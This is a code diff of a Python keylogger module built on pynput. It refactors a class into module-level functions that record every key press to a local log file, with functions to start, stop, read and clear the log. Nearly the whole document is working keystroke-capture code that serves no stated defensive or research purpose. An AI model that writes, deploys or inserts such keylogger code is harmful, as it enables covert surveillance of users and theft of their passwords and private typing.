@@ -1,46 +1,39 @@
-import logging
+import os
+
 from pynput import keyboard
 
-# Configure logging
-logging.basicConfig(filename='logs/keylogger.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')
+log_file = "logs/keystrokes.txt"
+listener = None
+os.makedirs("logs", exist_ok=True)
 
-class Keylogger:
-    def __init__(self, log_file="logs/keystrokes.txt"):
-        self.log_file = log_file
-        self.listener = None
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f"[{key.name}]")
 
-    def on_press(self, key):
-        try:
-            with open(self.log_file, "a") as f:
-                f.write(f"{key.char}")
-        except AttributeError:
-            with open(self.log_file, "a") as f:
-                # Handle special keys (e.g., space, enter)
-                if key == keyboard.Key.space:
-                    f.write(" ")
-                elif key == keyboard.Key.enter:
-                    f.write("\n")
-                else:
-                    f.write(f" [{key.name}] ")
+def start_keylogger():
+    global listener
+    if listener is None or not listener.running:
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
 
-    def start(self):
-        if self.listener is None:
-            self.listener = keyboard.Listener(on_press=self.on_press)
-            self.listener.start()
-            logging.info("Keylogger started.")
+def stop_keylogger():
+    global listener
+    if listener and listener.running:
+        listener.stop()
+        listener = None
 
-    def stop(self):
-        if self.listener is not None:
-            self.listener.stop()
-            self.listener = None
-            logging.info("Keylogger stopped.")
+def read_log():
+    try:
+        with open(log_file, "r") as f:
+            return f.read()
+    except FileNotFoundError:
+        return "(No keystrokes logged yet)"
 
-if __name__ == '__main__':
-    # Example usage for testing
-    import time
-    print("Starting keylogger for 10 seconds...")
-    keylogger = Keylogger()
-    keylogger.start()
-    time.sleep(10)
-    keylogger.stop()
-    print("Keylogger stopped.")
+def clear_log():
+    with open(log_file, "w") as f:
+        f.write("")
+
